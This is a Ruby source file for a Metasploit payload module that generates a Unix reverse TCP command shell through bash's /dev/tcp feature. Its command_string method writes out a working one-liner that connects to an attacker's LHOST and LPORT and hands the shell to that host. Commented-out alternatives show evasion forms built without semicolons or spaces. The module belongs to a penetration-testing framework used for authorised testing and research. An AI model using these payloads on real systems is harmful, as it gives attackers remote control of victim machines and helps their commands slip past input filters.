##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Unix Command Shell, Reverse TCP (/dev/tcp)',
      'Description'   => %q{
        Creates an interactive shell via bash's builtin /dev/tcp.
        This will not work on most Debian-based Linux distributions
        (including Ubuntu) because they compile bash without the
        /dev/tcp feature.
        },
      'Author'        => 'hdm',
      'License'       => MSF_LICENSE,
      'Platform'      => 'unix',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd_bash',
      'RequiredCmd'   => 'bash-tcp',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    fd = rand(200) + 20
    return "0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}";
    # same thing, no semicolons
    #return "/bin/bash #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}"
    # same thing, no spaces
    #return "s=${IFS:0:1};eval$s\"bash${s}#{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']}$s<&#{fd}$s>&#{fd}&\""
  end
end
